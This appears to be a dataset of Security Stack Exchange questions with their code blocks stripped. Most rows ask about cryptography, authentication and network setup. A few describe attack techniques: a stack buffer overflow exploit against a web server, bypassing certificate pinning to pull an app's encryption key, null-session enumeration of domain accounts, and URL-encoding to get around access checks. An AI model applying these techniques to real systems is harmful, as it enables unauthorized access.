","Target hardware is a rather low-powered MCU (ARM Cortex-M3 @72MHz, with just about 64KB SRAM and 256KB flash), so walking the thin line here. My board does have ethernet, and I will eventually get lwIP (lightweight TCP/IP FOSS suite) running on it (currently struggling). However, I also need some kind of super light-weight alternative to SSL/TLS. I am aware of the multiple GPL'd SSL/TLS implementations for such MCU's, but their footprint is still fairly significant. While they do fit-in, given everything else, don't leave much room for others. My traffic is not HTTP, so I don't have to worry about HTTPS, and my client/server communication can be completely proprietary, so non-standard solution is okay.

","I need to create a certificate for email encryption and signing that has to be used by Outlook 2003+. I'm using OpenSSL, my self-signed root-CA is already imported into the trusted root-CA store. These are my steps to create a p12 Identity file importable by Outlook: {code-blk} cli option in the 3rd openssl-statement above. My problem: Outlook still chokes on this (it's valid in Thunderbird, though). I don't have the English error message (could provide the German one, though), these are the rough translations of the dialogs I see: ""Grant usage of a key to the application: Grant / do not grant"" (you may show key details in the lower left - it says there is no description and no context information) ""Repeat the procedure. The protected key cannot be accessed, make sure the specified password is valid."" (I did - I even tried every possible variation of password/no password in openssl and Outlook! For the next step, I'm led back to the first dialog and click ""Cancel"") ""Error in the underlying security system. Access denied!"" My current setup in Outlook: Sign emails, transfer text and signature in plaintext and attach the certificate. I also restricted the certificates usage to secureEmail and disabled OCSP. When importing the certificate (and on generation) I used the exact same password for every password request and the same description as friendlyName, CN and alias (maybe these can be different, I just didn't want to risk anything while trying). I really don't get what Outlook doesn't like / wants to tell me. If needed, I will gladly provide additional details. Thanks!",364,389,1,True

This step allows the algorithm to be updated with larger iteration counts as hardware get faster.

","So I've been toying with the idea of having non-deterministic salt values for hashes. Let me explain what I mean: Basically, I applied some properties from Bitcoin including a ""difficulty"" (ie, hashed value must begin with a certain number of 0 bits) and came up with something that could be used for password hashes. My algorithm: {code-blk} value for how many times it must be hashed, which is not stored along with the hash. In this way, you must hash the password a number of times until you find something that meets the required difficulty level. This is easy to verify, but does require time because it's unknown exactly how many times the value must be hashed. There are some interesting properties of this mechanism: An incorrect password is slightly undetectable. The only way to know it's incorrect is if you know the difficulty level and you find a hash which meets it, but doesn't match the hash It's probably quite hard to compute any of this in parallel? In theory, it's completely unknown how long it will take to verify or compute a hash (other than probabilities) Bruteforce would probably be hard because each password attempted may result in extremely large amounts of hashes needed to verify it to the difficulty However, I can't really come up with a good use for these properties. Is there any good things to apply such a scheme to or is there anything that uses such a scheme? Also, are there any potential weaknesses to this hashing scheme? For my testing, I used SHA256 as the hashing algorithm, and it got quite slow after a difficulty of about 20 bits of zeros. However, this could easily be replaced with using scrypt, bcrypt, or SHA512 Also, one more idea is that you could possibly construct ""quick"" to verify hashes, but only when given the correct password. (by changing the salt if, say, you've already hashed the value X times and you want to target only hashing the value Y times to verify it when given a correct password)",109,478,1,True

That is, I want people (PGP users…) to be—fairly—sure that, by using my public PGP key, they are actually communicating with the real me (which can be achieved by checking who signed my public key, and if they seem trustworthy, then I could be too). When my [public] key will have enough trusted signatures, my own signatures on other people’s keys will have much more sense. Bad-case example scenario: I sign Mallory’s (a bad guy) key, then one year later, my key is signed by, say, a Debian maintainer (a very trusted guy).

On the official Tor homepage they claim: Tor does not protect all of your computer's Internet traffic when you run it. Tor only protects your applications that are properly configured to send their Internet traffic through Tor. To avoid problems with Tor configuration, we strongly recommend you use the Tor Browser Bundle. It is pre-configured to protect your privacy and anonymity on the web as long as you're browsing with the Tor Browser itself. Almost any other web browser configuration is likely to be unsafe to use with Tor. The Tor Browser will block browser plugins such as Flash, RealPlayer, Quicktime, and others: they can be manipulated into revealing your IP address. Similarly, we do not recommend installing additional addons or plugins into the Tor Browser, as these may bypass Tor or otherwise harm your anonymity and privacy. Is this something of concern for me when I run the script below (with Vidalia/Tor enabled)? Would my real IP be revealed if I ran the script on different webpages? The webpage in the code below (my-ip.heroku.com) is very simple and only returns my IP address.

","Hello information security stack exchange! I made a captcha application in PHP. It's certainly not a great idea to do so, but I was bored and I wanted to learn about Bézier curves and Bresenham line algorithms. Therefore let's disregard that my application is not really secure against serious cracking attempts that try to crack it with OCR methods. To my question: My app basically writes every two hours 10 new captcha images in a directory (with a cronjob). If there are more than 1000 images in the directory, it replaces the oldest 10 images with the newly generated ones. So there is always a pool of 1000 captchas that slowly but steadily refreshes. All the captcha images have a 18 char long random filename and I have a associative array in my database that maps the filenames as keys to the captchas value.The array looks something like this: {code-blk} Whenever my captcha application hooks into a comment form or login form in order to inject a captcha image, it choses a random captcha from the pool and let's the user try to solve it. Now you might already see the security drawback: How can I make sure that a user doesn't download all captchas and maps them manually (Decipher the captcha manually and map it to the md5-sum of the png-image) to it's corresponding string value and then spams my site with a script? The attacker would just need to download around 20 percent of all images and then he had a average success rate of, errhh, yeah 20%, in succeeding to spam my site (The script would just refresh the form as long as it serves a captcha that it knows). How would you defend against such attacks? (Under the condition that my app architecture doesn't change: I can't generate captchas on demand, it would be too slow).

","I'm developing an application (C#) for Microsoft SharePoint platform that uses SQL Server's (2008 R2) Remote BLOB Storage (RBS) technology. To accomplish certain client-side tasks, I must obtain username/password pair from the database and pass it to a constructor that looks like this (): {code-blk} I can then feed the decrypted password to the constructor (client-side) which encrypts it internally, uses it to perform some tasks and disposes the credentials at the end (see MSDN sample code above). It seems to me that many things are very wrong with this design. Even if I decided to deploy a custom orthogonal database for storing one-way hashed passwords only, I would at one point need to ""decrypt"" them to plain-text to feed them to the constructor above. My question is, are there ways to reasonably minimize security issues with this approach while accepting the premise of the question (i.e. I need to pass decrypted credentials to the constructor), or is this design inherently so insecure that it's beyond improvement?

RSA - to digitally sign the response from the server to ensure that there is no man in the middle. My first thought was to use RSA to securely transport the key.

","I have an c/c++ program used for encrypting data for communicating between two ends. Encryption is done using OpenSSL (0.9.8d-fips, Sep 2006). Think it'll be worthy to mention that I'm not much familiar with using OpenSSL. The program works fine for larger packets. But the size overhead is very high when encrypting smaller size packets. I've done a test to demonstrate the issue. {code-blk} The test was done while incrementing the number of input characters from 1 to 10000 . Following graphs illustrate the results more clearly. Graph 1: Encrypted size vs Input Size Graph 2: Ratio vs Input size From the second graph, it's clearly visible that the encryption overhead is very high for smaller inputs (size less than 300bytes). Is this normal/acceptable? If it is so are there any alternatives (with less overhead). Because the application uses smaller packets heavily (Bundling them together is not an option). As mentioned above, OpenSSL 0.9.8d is used, which is a bit older version (1.0.1g, April 2014, is available now). Will the problem be fixed if I upgrade it?",267,281,1,True

Below is my current strategy; Have I overlooked obvious best practices? I've read  and think that I have the relevant parts covered. Flow An administrator triggers a password reset for a user in the system. The system locks out the user from the system, generates a 40 characters random alphanumeric string as a authtoken, and stores this hashed in the database with SHA1, together with the encrypted username, the time is was created and the hash of the old password. If the user have any previous authentication tokens in the db, it deletes them. The system sends a link to the email connected to the user having it's password triggered for resetting. The user clicks the link, which is over https, and the system reads the authtoken. The system hashes it again with SHA1, searches the database for it: The authtoken does not match: Error page. {code-blk} class, which is discouraged due to less than optimal randomness, would this really be a problem considering that only an an authorized and authenticated administrator can trigger the reset?",145,288,1,True

","I need to encrypt some data and have it decrypted on a later point in time. The data is tied to specific users. I've gathered two possible solutions... 1: The first one is derived from the official docs (example #1 @ ): {code-blk} I'm aware that both approaches to the key handling is interchangeable, I purposely made them different in that respect in order to highlight possible solutions, please feel free to mix and match. Personally I feel that the first one offers tighter security since both key and initialization vector is properly randomized. The second solution however, does offer some form of non-predictability since the key is unique for each piece of encrypted data (even though it suffers under the weak randomization of md5()). The key could for example be the user's name. 3: So, which one is preferable? I'm slightly in the dark since the Stackoverflow answer got a whopping 105 votes. Other thoughts, tips? 4: Bonus question!: I'm not incredibly brainy on server security aspects, but obviously gaining access to the PHP files would expose the key, which as a direct result, would render the encryption useless, assuming the attacker also has access to the DB. Is there any way to obscure the key? Thank you for reading and have a nice day!",450,306,1,True

However I want to use a well-known standard such as . While coding an AWS-compliant client and server HMAC auth implementation, I noticed some uncommon aspects of the standard's design. I fail to fully grasp several design choices that were made. Question 1: Why does AWS use a complex signing key (produced via HMAC) instead of the shared secret itself? describes: Before you calculate a signature, you derive a signing key from your AWS secret access key. (You don't just use your secret access key to sign the request.) You then use the signing key and the string to sign that you created in Task 2: Create a String to Sign for Signature Version 4 as the inputs to a keyed hash function. The hex-encoded result from the keyed hash function is the signature. To calculate a signature Derive your signing key. To do this, you use your secret access key to create a series of hash-based message authentication codes (HMACs) as shown by the following pseudocode, where HMAC(key, data) represents an HMAC-SHA256 function that returns output in binary format. The result of each hash function becomes input for the next one. Pseudocode for deriving a signing key: {code-blk} The date must be in the YYYYMMDD format.

","I'm looking at  and am left a bit confused about why you would use . The document even talks about using : Algorithms of matching strengths should be used together whenever possible.  For instance, when AES Key Wrap is used with a given key size, using the same key size is recommended when AES GCM is also used.  If the key encryption and content encryption algorithms are different, the effective security is determined by the weaker of the two algorithms. Essentially I'm wondering why you would use AES key wrap at all. Example So for an example comparison, using the A256GCM encryption algorithm I need a 256-bit key. Just to be easy my key will be ""secret0123456789secret0123456789"" and I'm encoding ""Test"".

Direct JWE results in a smaller payload to be sent over-the-wire, and I would presume it's slightly faster to both encrypt and decrypt because it's skipping a step. Does using AES key wrap yield higher security, and if so, why? If not, why would you use it instead of just direct content encryption?",234,374,1,True

So, the basic problem is that S needs to know who it's talking to. Some more clarification: A1 is JavaScript-based. A JavaScript in a browser is talking to the web server A1. The JavaScript is never directly talking to S, however. The web server A1 has some means to forward messages to S, e.g. a simple PHP script. There is probably no way to block evil users from contacting S through A1 in the same way as the JavaScript does. To prevent abuse of this, S is a session-based service that requires a username and a password to generate a session key. Browsers pass the session key to A1 or A2, which then pass it on to S.

Of course it is pretty complex and undoubtedly it's built by people way smarter than me, but still I just couldn't help but wonder, if I built my own hashing function that wasn't vulnerable to rainbow tables and didn't store the salt in obvious places such as extra columns in the database or use user information like name or email as salt, would that be any good? I just spent like 5 minutes to prepare this example for you, which uses, of course, md5, as I know it is the most hated around PHP developer critics {code-blk} It will produce different hashes for the same input every time and the salt is blended in the final output hash, if you don't explicitly know where it is, I don't think it can be found, but that's why I'm posting here, to find out if I'm wrong.",233,321,1,True

","Edit: Let's assume Windows 7 and potentially Windows Server 2003/2008. IMHO, any machine that has malware should be reimaged/reformatted/OS reinstalled before it is deployed back into the environment. However, this isn't always practical. If the malware-type can be identified and potentially removed, sometimes the business dictates that a machine is remediated. So, my question assumes that management insists that a machine is remediated and has accepted the risk of doing so. Also, assume that all root cause analysis on the infection has already been completed. I would like to build a checklist of things to look at with the goal of reversing any changes malware has made to a system. Edit: Due to the broad nature of this, perhaps those that are familiar with malware analysis can comment on the most common things they see malware change on a system that are related to maintaining persistence even if the malware is disabled/removed. (e.g., create an account or other backdoor that allows remote access to a system). Obviously, there are entire books and courses on this subject. This is not meant to be comprehensive. Rather, it is a checklist of common things to check/fix for a situation where reinstalling the OS is not an option and it is believed the malware has already been removed. Here are a few examples: {code-blk} While I agree a reimage is much simpler and a better solution, I thought it would be a good idea to develop a best practice for attempting to verify a machine has been remediated.

","We have two hosts, theoretically in the same data center. The two machines are hosted at Online.net. We're having a bit of a debate: should the traffic between the two hosts be encrypted. The traffic we need to exchange are Redis queries. The data that will be exchange is Twitter and Facebook user IDs, a code to indicate a job to do, and a market ID, which is itself a UUID. A typical query and response would be: {code-blk} The two implementations we're thinking of: Use an SSH tunnel with port forwarding to hide the Redis server from the public Internet. On the machine hosting the Redis server, create a separate user with a single aurthorized_keys, with proper securities to not allow running arbitrary programs; Simply use the firewall to limit traffic to Redis to the single IP address we need, nothing more. We're not sure which would be ""more secure"" (or more appropriately, less risky). Adding users and configuring SSH introduces complexity, while adding a firewall rule is much simpler. On the other hand, if an attacker reads in-flight packets, what useful data can they collect? What I want to protect against is after having gained access to the client machine, an attacker could gain a foothold into the Redis server machine, which hosts many more services.",40,306,1,True

","I'm looking at a scheme where users/servers post messages to each other.  One of the main challenges is to prove ""ownership"" of a URL - defined as the ability to receive messages.  This can be done with the following pattern: {code-blk} At the end of this exchange, User A and User B both have bearer tokens that they can use in subsequence requests to prove their ownership of their respective URLs (proof being that they received the tokens at all). However, this exchange has to happen before any messages are exchanged.  Are there simple patterns that could be used to instead perform authentication after a message is sent? I'm looking for something extremely simple in terms of interaction.  In the above case, each server/user decides how to generate/validate tokens themselves - the actual authentication is done by just citing a bearer token (without caring how it actually works inside), and that's ideal.",51,209,1,True

","I know, the general advice is ""keep your hands off crypto stuff"". And the standard way to encrypt backup data securely would be using GnuPG. However, for a rather academic exercise, I would like to think through a protocol that would work just with OpenSSL's standard tools (i. e. dgst, enc, rsautl & Co) invoked from a POSIX shell. The scenario includes a more or less trusted system on and from which backups are created - this could e. g. be a mail or file server. Then there's a storage which is not 100% to be trusted (e. g. a cloud storage, or a backup server not entirely under my control). So the purpose of the crypto is to protect confidentiality and integrity of the data while stored on the untrusted storage. This protection should also work in case the trusted system gets compromised - at least for data stored before the trusted system was compromised. So here's a kind of protocol that should fulfill the aforementioned criteria: Step 1: RSA Key Pair This step only needs to be performed once. An RSA key pair is needed. This key pair shall not be created on the ""trusted"" system, but instead on a really trusted box (e. g. a trusted work station or wherever you'd trust to keep your GPG key ring). Since the private key is only needed for recovery, it shall never enter the realms of either the trusted system or the untrusted storage. Key size needs to be 4096 bits or above (we come to that later). OpenSSL usually offers key generation and separation by those commands: EDIT: switched to PKCS#8 for the keys, being probably more resistant to brute force attacks {code-blk}, given that this would require the private key to reside on the more or less trusted system?",54,423,1,True

I came across - 'Key Diversification' which is used in some smart card apps where they derive a seperate AES key from a master key for each instance(does the same not apply here?)

","I know that email is inherently insecure anyway, but considering that pretty much everyone that I send email to is using a large, somewhat-trusted cloud provider, (hint, starts with G) I would expect that most of my email is sent through relatively secure MTAs that either require or prefer to use TLS. From that assumption, I would draw the conclusion that if I wanted to host my own email server and if I cared about security, then it MUST support TLS and have a certificate signed by a trusted authority. Ok, that's all fine, I can set that up myself. But what if I want to self-host this server? I know I can easily pay a cloud provider to host it for me, but I have an irrational desire to escape the cloud altogether and build my own infrastructure. However, that opens up a host (no pun intended) of other problems. Email delivery from residential IPs is spotty at best. Internet access and electricity don't have 100% uptime in residential areas. Maybe I mess up my server and have to redeploy it. Or maybe I have to take it down to upgrade it. So, maybe I want to rent a VM from a cloud provider and run an SMTP server, but at the same time I don't want my private key to leave my own machine. I am a very capable programmer, so I'm considering actually attempting this. I'm just unsure if it is physically possible given the TLS protocol.

The IP address followed by port 80 just appeared out of thin air. Upon investigation *.com.com resolves to this IP, which seems to be a host for malware.

Also, had this been maliciously inserted by an intruder, I have no idea what it would accomplish.

The auth log shows a number of unsuccessful SSH log in attempts from various IPs, in the several hours that the server's been up, but no successful log ins other than my own.

It is chosen by the sender and is carried in each TLS record in the GenericAEADCipher.nonce_explicit field. The nonce_explicit length  (SecurityParameters.record_iv_length) is 8 octets.

","Summary: A TLS client appears to be failing to negotiate when the server hands over a 127-byte pubkey in the DHE_RSA Server Key Exchange message, but succeeding when it hands over a 128-byte pubkey.  What's the deal with pubkey length, and specifically, is this legitimate behavior on the server's part? Gory details: I have a client (software unknown) that's experiencing intermittent failures connecting to my TLS server (F5, TLS 1.2).  Successful and failed connections all settle upon Cipher Suite TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 (0x009f) in the Server Hello.  All connection attempts reach Server Hello Done and failed connections are FINned by the client immediately following that. Looking at packet captures, the failures all seem to coincide with a ""Pubkey Length"" of 127 in the Server Key Exchange handshake: On the other hand, every successful negotiation with this client has involved a ""Pubkey Length"" of 128 in the Server Key Exchange handshake: Whenever the server sends the 127-byte version, the client responds with a FIN/ACK instead of the Client Key Exchange.  The conclusion we've come to is that the 127-byte pubkey length is not acceptable to the client.  I've read   to see if I can get an idea for what's allowed and they're not helpful (to me, at least!): {code-blk} So is it 1024 or 1016 bit?  Does the 'p' length indicate key strength instead of the Pubkey Length (ssl.handshake.ys_len for those following along in Wireshark)?  Where is ""Server Key Exchange"" for Diffie-Hellman defined?

","Context I am trying to learn more about web security through looking into how various iOS native apps work under the hood. I have been using Burp Suite as the MITM tool to sniff out the network traffic sent and received from the apps, and on the iPhone I have SSL Kill Switch 2 installed to bypass any certificate pinning. It's very interesting and amazing to see how everything works under the hood, for a beginner like myself. I had no trouble at all with most of the apps, this includes some apps that are supposed to have high security, such as several mobile banking apps - as soon as the SSL is lifted, everything is visible in plain text. Interestingly, some mobile games are giving me a hard time. Challenge The intercepted traffic appears to be encrypted JSON files. For example, {code-blk} seems to be the check-bits based on the timestamp. Because performing two identical actions in game results in two almost identical JSONs, except for the timestamp and this particular section in the payload. The payload's encryption has got something to do with Base64 or AES, because of the signature trailing =('s), and different payloads' lengths are always multiples of 4. I am not sure if the latter means anything. The encryption key used seems to be constant. It does not change from different sessions and on different devices. Question Am I right in my analysis so far? Where should I go from here? With my almost-null knowledge in these fields, I am not sure what's the next step to take. I am think I might need to decompile the app and look into the binaries to try to see if I can find the decryption key/function lying around. But I am not sure. I am aware that there will be a lot of learning ahead, but I don't mind it since I am enjoying it very much and I would appreciate greatly some help, even if it's just a quick list of the topics and URLs I should look into. Update 2015/11/23 I dumped out the decrypted binaries of the app and ran a strings command on them, then I made a Python script to successfully pick out the encryption key.

What is the best way to generate and deploy such certificates? Note that: Solution should not be browser specific (if possible; IE, FFox and Chrome are minimum). Browser should combine certificate with some hardware fingerprint before trying to use. I do not care if certificate is invalidated by system upgrade (I am perfectly OK issuing a new one... and deleting the old). Checking should be done ""server-side"". A SuperUser comment says: {code-blk} Smartcards are not a viable solution for me, but some kind of USB equivalent could be used, if necessary, provided devices are cheap enough (few USD/each). Alternatively I could request browser to send some information and try to validate the Client for there (something akin to  coupled with custom certificate). Would that work?

Let's take this program ( test.c ) as example: {code-blk} After the malloc in (1) we have in both cases that the space is taken directly from the top chunk, and this is as expected: However after the free in (2) the first difference can be noted: As you can see from the screenshot in the ELF-64 bits the chunk that has been freed is not updated with the new size, but the size is still 0x71 and the first QWORD is nullified. In the ELF-32 bits, as I expected, the freed chunk is instead merged with the Top Chunk and the size is updated to 0x20f99 + 0x68 = 0x21001. Later when the second malloc in (3) is executed, in the x64 case the new chunk is allocated right after the previously chunk by shrinking the top chunk, while in the i386 case the previously freed chunk is reused. These are only two of the differences that I have noticed, and I think that there are many others... So, is there somewhere a document/research/white-paper that describes these differences? I am using the libc-2.23.so on an Ubuntu 16.04 Thanks in advance for any insight about this.",113,364,1,True

","XSS & Single-Page Apps I'm researching on web security, and have seen that  is good for CSRF prevention, distributed system architectures and processing performance. But another problem is XSS. Not specifically talking about the injection itself, but the libraries. With single-page apps developers normally include hundreds of different modules into their code, which could later on execute maliciously when the app is in production. Patching XMLHttpRequest So I had the idea to patch the XMLHttpRequest property and take control of the original ""native code"" function, preventing third-party code from making ajax requests. {code-blk} I tested this in the console with facebook and youtube... all their ajax loaded content stop working. Malicious Example An example of uncaught malicious behavior is code that only executes in production by checking if the window.location is something like ""app.x.com"" so the developer doesn't realize of the ajax requests during development. Patching the XMLHttpRequest property would prevent this, and taking into consideration that all other mesures were taken to prevent XSS (sanitization), this would close the final gap and let you take control of network requests, preventing malicious code from stealing the auth tokens.

","I stumbled upon . I have the same problem as the OP, and am sorry to report that the proposed answer does not resolve it. Certificate in question has been verified by OpenSSL-1.0.2h: {code-blk} Yet the current stable Firefox (47.0) is giving me that same message, and refuses to use that certificate for establishing a TLS session (doesn't even offer it among the available certs). It shows this certificate (among others) in Prefs->Advanced->View Certificates. Needless to say, CA that issued this certificate, was imported to ""Authorities"" and marked as trusted for all the three options. The only possible thing that I could think of - this CA does not offer CRL or OCSP, so neither it not the certs it issues have pointers to CRL or OCSP. One suggestion I got was: Welcome on Security SE. Do not hesitate to post your question as a new question referencing this one. Details of both the CA and end-user certificates can be helpful. However, before doing so you should try to add the ""Key encipherment"" key usage to the certificate as a first step. In case it does not help, try to add ""Data encipherment"" and remove ""Non repudiation"" (or disable the ""Critical"" flag on these extensions). The problem with the above is that we have fairly strict rules on the Key Usage attributes, particularly on certificates that that are provisioned to hardware tokens. So it is not possible for us to, e.g., remove ""Non-repudiation"" from a Digital Signature cert, or add ""Key Encipherment"" to it. (Even in the unlikely case that the stupid current-release Firefox would work with such a cert, we wouldn't be able to deploy it.) I'd appreciate any help.",398,425,2,True

","Let me apologize in advance for this question has been answered. I did have a good look and if it is here somewhere I missed it. My question hopes to clarify exactly what happens when a validating resolver queries a DNSSEC aware nameserver for a RR. I thought I understood the process, then I read an explanation written by someone I would think can speak authoritatively (no pun intended) on the subject. I think the easiest way for me to do this is to explain what I thought the process looked like and then the contrasting version. And hopefully, someone among you all will be able to clarify where I might be going wrong. Example A (or how I thought a DNSSEC query worked): Host A sends a query to it's  recursive caching DNS server for www.example.com The recursive server sends an iterative query to a DNS server that is authoritative for the root zone The root DNS server can't answer the query directly so it responds with: {code-blk} Validation now begins when the recursive resolver asks the isc.org name-server for the keys for it's zone. Once those keys are provided then the recursive server then queries up (the parent) to validate responses in reverse fashion to Example A, until a trusted key (presumably or typically from the root) confirms that the chain can be trusted.

2644,"# For extra security beyond that provided
# by SSL/TLS, create an ""HMAC firewall""
# to help block DoS attacks and UDP port flooding.
#
# Generate with:
#   openvpn --genkey --secret ta.key

# The second parameter should be '0'

","In a normal setup (cert), you have a strong encryption - just like here - for example, AES256. But you also use dh and the tls params. Just to be absolutely secure. Now, if you use the static key setup (), which is a simple 2048-bit key file shared between the server and client that you transfer yourself through a previously established secure channel... then you are not able to use dh and tls. How safe is to have the server running 24-7 on a custom port, using this static key setup? Copied from the sample {code-blk} dh provides . This is what you will miss without the normal certificate based setup. By the way: Let's imply the server is DDoS protected to an extent. OVH and both Hetzner, and even VPS providers now offer DDoS protection so it's pretty much a standard. Let's imply the user has a firewall, and only SSH and OpenVPN is allowed. Update #1: Let me summarize things. Static Key is just one file that you copy to your server, and to your OpenVPN folder. It will allow you to have a very simple setup with proper encryption even. (AES, and so on). This setup, however, lacks forward secrecy. This is stated on the official OpenVPN website. Not only that, it will also disallow you to use the ""HMAC firewall"". Losing forward secrecy is a clear drawback(*). That is half of the answer. But what about the HMAC Firewall? Does it make your server vulnerable? Your OpenVPN easier to get breached? (*) - Of course for someone to decipher the data, that specific someone needs to log every bit of data. Then, he has to acquire your secret key. Then, he has to somehow - spending insane amount of manhour and effort - rebuild all of the data into meaningful data. This is still a serious concern if the data submitted through OpenVPN is sensitive.",113,471,1,True

The way it works is strictly in accordance with what : by including so-called ""synchronizer tokens"", one in a HTTP cookie, and another in a hidden input named {code-blk} field is what bothers me the most: to me, it is akin to claiming that an attacker has transferred gazillion dollars from my bank account because I voluntarily gave him my iPhone to fiddle with, and he saw the one-time password that my bank sent in an SMS. I imagine that the only way this attack could potentially work is if we were not using HTTPS, were vulnerable to XSS, were using non-HTTP-only cookies and were negligent with a Same Origin Policy.

","While testing our Windows Domain Controller (Server 2012 R2), I was able use the Linux utility rpcclient to enumerate user accounts and groups via a Null Session (see output below). Checking the Windows Registry keys on the DC, I confirmed that: HKLM\System\CurrentControlSet\Control\Lsa\RestrictAnonymous = 0 HKLM\System\CurrentControlSet\Control\Lsa\RestrictAnonymousSAM = 1 HKLM\System\CurrentControlSet\Control\Lsa\EveryoneIncludesAnonymous = 0 Testing the same rpcclient commands against a lab environment Server 2012 R2 DC with the exact same three Registry settings resulted in a ""NT_STATUS_ACCESS_DENIED"" message, as expected. Putting aside the issue of having Null Sessions enabled in the first place... My understanding is that a value of ""1"" for the ""RestrictAnonymousSAM"" key should disable the ability to enumerate users and groups via a Null Session, so why am I still able to enumerate user information using rpcclient? Also, if the RestrictAnonymousSAM key is insufficient, what other changes are necessary to completely disable user and group enumeration via Null Sessions? {code-blk}",395,330,5,True

","I will be using JWT for authentication for my REST API. I am using third party cloud services and database write are very expensive so I am trying to avoid writing to the database as much as I can. Due to this I want to avoid using a refresh token because that way I would have to frequently update the database (writing is almost 10x more expensive than reading). My general plan for authentication flow is the following: 1)User registers (assuming email authentication is complete and all) and the following database table gets populated as such: {code-blk} of 1. This means when they were being verified the token would say 1, but the database would show 2, they would not match. 12) The valid user would sign in again and get the proper token with the increment showing 2 and be able to do whatever they need to do. With this method the only time I would need a database write is when an account is hacked, opposed to updating the database every time the refresh token expires. Besides the inherited security downfalls of JWT, is there any obvious holes in this strategy (I understand nothing is ever really secure)? Cheer",52,248,1,True

","I'm trying to apply the principle that  in a system with many services through which this toxic asset must flow. The system can be abstracted to 3 actors: clients, intermediaries, and (data) sources. Clients will eventually wish to view some sensitive data (think credit card numbers or PI info) that is housed in a secure data source. Intermediaries are the services in between the client and the source, and so must come into contact with this sensitive data, which is the whole problem. For the purposes of this scheme, I want to assume that the client and the source are secure (not vulnerable to XSS, injection, etc). My goal is to design a scheme that will mitigate the threat of exposing sensitive data from intermediary services. The method of exposure could be anything, but may include disgruntled employees snooping for credit card numbers, or the service accidentally logging them to places that non-privileged admins can access. There is an additional requirement that the intermediary can restructure the data (otherwise there would be no point to having an intermediary in the middle at all). For example, imagine the following payload coming from a source: {code-blk} field wherever it likes, and it will never have access to the original value since it doesn't have access to the user's private key. Of course, the client will then have to be smart enough to decrypt the field using its private key once the intermediary puts it in an arbitrary place in their own response. My second question is thus, does this seem like a sane scheme to negate the ""infectious"" quality of toxic data? Of course, I don't see any points of vulnerability above and beyond standard attacks against whatever encryption and decryption algorithms we choose to use, but that's kind of the whole reason one shouldn't roll their own cryptosystem :) Thanks for putting up with the long read if you've made it this far!",155,433,1,True

","Sorry if I messed up in any manner, e.g. title, details, tags, layout, venue, response plan, etc. I know a little of the stacks and security in general. Short Version: I found material on my other machine which almost certainly is an  related infection. Evidence suggests it's mostly likely either a variant of  ransomware, or a spying & control trojan (, ). No damages are visible so far, and can't tell if infection is active, waiting, or dead. Would like advice on how to progress. Events: Yesterday I booted up my other machine to be greeted with a ""virus () found & quarantined"" message from my AV (MSE). Apparently Skeeyah is a type of ""trojan"", which is stuff that has full spying and control capacity on the victim machine, no restrictions. Due to past experiences, I decided to manually revise my machine's condition, and I saw some initial red flags which made me immediately power off my machine & disconnect its network cable, then go into Safe Mode. Follow-up investigation suggests the initial red flags were false-positives after all. However, I found actual red flags during the same follow-up. Actual Red Flags: They are five {code-blk} entries and deleting corresponding files. How safe is Safe-Mode in these scenarios? I heard it can be blocked, but how easy/hard is that? And if it is accessible, how much does it protect? What if networking/command was also enabled? How useful is monitoring processes via Task Manager? It helped me several times in the past, can't tell if it's just luck or for real though. How easy/hard it is to find weird names or high CPU usage there? How easy/hard it is to impose as usual legitimate processes? Is there enough timeframe for a problem to be spotted by a person?

The Server is configured to deliver intermediate and my Cert as the certificate path and will hint that Root A should be the Trust Anchor. A client will obviously accept my Cert if it has Root A as a Trust Anchor. Will a client accept my Cert if it has only Root B as a Trust Anchor? Will a client accept my Cert if it has only intermediate as a Trust Anchor? Will a client accept my Cert if it has only a self-signed Version of intermediate (but same priv/pub Key and Subject) as Trust Anchor?

","I'm learning about stack buffer overflow and I'd appreciate help. I'm exploiting simple web server containing this log function. Argument s1 is the input that I supply via HTTP.

My question is why? Why is the nops sled necessary in this case? My hypothesis is that the shellcode is decoding itself and overwriting some memory before it; when I include nops, the memory is writable, when I don't, the memory is not-writable (because it is before ESP?) and therefore it seg faults. My second question is whether this exploit would work with ""call %esp"" instead of ""jmp %esp"". According to what I found on the internet it would work, but I don't understand why. Imagine the same exploit as wrtitten above but overwriting the EIP with address containing ""call %esp"". This is my understanding what would follow: log function returns. EIP is popped of the stack and processor jmp on it. ESP points under (bigger address) just-popped EIP (NOPs are there). processor finds ""call %esp"" instruction. EIP is pushed to stack. ESP now points at the just-pushed EIP. jmp %esp is executed. Jumping on the top of the stack where is the EIP that was just pushed. What now?

","I have a BT Smart Hub as my router which has no guest network functionality, I also have a Netgear Nighthawk D7000. Initially I attempted to use only the D7000 and take advantage of the guest wifi feature but I couldn't get the setup right so that BT's YouView and Internet TV Channels worked as required (some are encrypted eg BT Sport so wonder if this was the problem). I was considering a setup like this: {code-blk} Is the setup destined to cause endless headaches setting up or is it quite straight forward? The BT Smart Hub actually has an extra WAN port too, I wasn't certain if it was even a possibility to go from this WAN port to the Internet (WAN?) port on the D7000? Are there any extra benefits to this if it is possible? More secure? Any harder to setup? Tackling the issue that the Guest wireless device (or LAN connected) could take over the Main router and effectively track all traffic to and from the Internet from the Private router (which has my laptop / pc / mac etc), would using a VPN like F-Secure Freedome on all devices on the 2nd Private router significantly mitigate or even stop any MITM there? Is there any risk of direct access to the devices on the 2nd router via the main router or will the firewall in the 2nd router block this? This question is sort of a follow up to  as one of the answers suggested the setup here was backward but even if reversed would open the setup to Man In The Middle attacks and have all network out of the 2nd router potentially exposed.",55,364,2,True

He then told me that this is nothing like he has seen before and since this certificate was not issued by godaddy or microsoft he couldn't do anything about it. He then told me to hit the continue button and try to login. After doing so I was finally able to login successfully on my mobile phone and on my desktop.

","A month or so ago I was in the middle of one of my ""Distributed Applications"" classes and the professor was explaining us how to """"""properly"""""" authenticate users in a server. To demonstrate how to prevent users from accessing all files under a given directory (i.e. with name ""private""), the professor showed us some JSP code that was something like the following pseudocode: {code-blk} then URI wouldn't contain the literal string ""/private/"" so the user would be granted access. Yesterday I remembered that class, so as I was curious about it, I indeed found out that not only all my previous web projects in Uni actually had this vulnerability, but even some websites of serious companies also have this issue. You can access to a lot of pages where you should not be able to (basically user profile pages when you haven't logged in), just by percent encoding some character in the URL. So, as I've realized that there are a lot of people not caring too much about this issue I'm a bit confused. Isn't it a big flaw? What could be some attacks that could be done taking advantage of this issue? I'd just like to know, from a theoretical point of view if possible, how bad could get this issue for a site that does not manage url-encoding properly. P.S: I know that a plausible solution could be to also check if requested URL is percent-encoded and denying access to it. Or even if we'd like to go further and implement a more secure solution we could use a Key Distributed Center such as Kerberos. However I don't understand why you can find serious websites with 